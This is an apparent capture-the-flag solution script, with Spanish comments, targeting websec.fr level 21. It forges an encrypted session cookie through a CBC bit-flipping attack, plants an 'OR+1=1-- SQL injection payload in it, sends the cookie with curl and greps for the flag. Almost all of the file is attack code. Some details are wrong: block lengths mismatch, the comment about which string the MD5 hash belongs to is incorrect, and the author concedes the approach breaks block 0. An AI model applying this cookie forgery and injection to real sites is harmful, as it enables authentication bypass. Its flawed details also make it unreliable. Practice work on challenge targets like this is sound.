#!/usr/bin/env python3
import binascii
import subprocess
import re

# Cookie COMPLETA de testxx (no truncada)
cookie = "3d2d8bf19f0ce326f736a1443b952355b1fad1874477f658622708ae3c2b008c833e083ffd1bce3a3d4a8e0094382e536f94603fb7d8989981270cb4a9278477219ea6f7044fb140eee0fe5a22cca247"

iv_hex = cookie[:32]
ct_hex = cookie[32:]

iv = bytearray(binascii.unhexlify(iv_hex))
ct = bytearray(binascii.unhexlify(ct_hex))

# Plaintext:
# Block 0: "user/pass:testxx"
# Block 1: "/5f4dcc3b5aa765d6" (MD5 de "p")

# Estrategia: dejar username como está pero inyectar en el password
# Password actual empieza con "/" en block 1
# Cambiar password a "'OR+1=1--"

actual_b1 = b"/5f4dcc3b5aa765d6"
target_b1 = b"/'OR+1=1--+++++++"

# Modificar CT bloque 0 para cambiar bloque 1
for i in range(16):
    ct[i] = ct[i] ^ actual_b1[i] ^ target_b1[i]

# Esto corrompe bloque 0, así que necesito arreglarlo modificando IV
# Pero sin la key no puedo...

# Intentemos de todos modos
cookie_modified = iv_hex + binascii.hexlify(ct).decode()

cmd = f'timeout 8s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_modified}"'
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

if "WEBSEC{" in result.stdout:
    flag = re.search(r'WEBSEC\{[^}]+\}', result.stdout).group(0)
    print(f"FLAG: {flag}")
elif "corrupted" in result.stdout:
    print("Corrupted (esperado - block 0 se rompió)")
else:
    print(f"Otro: {len(result.stdout)}")
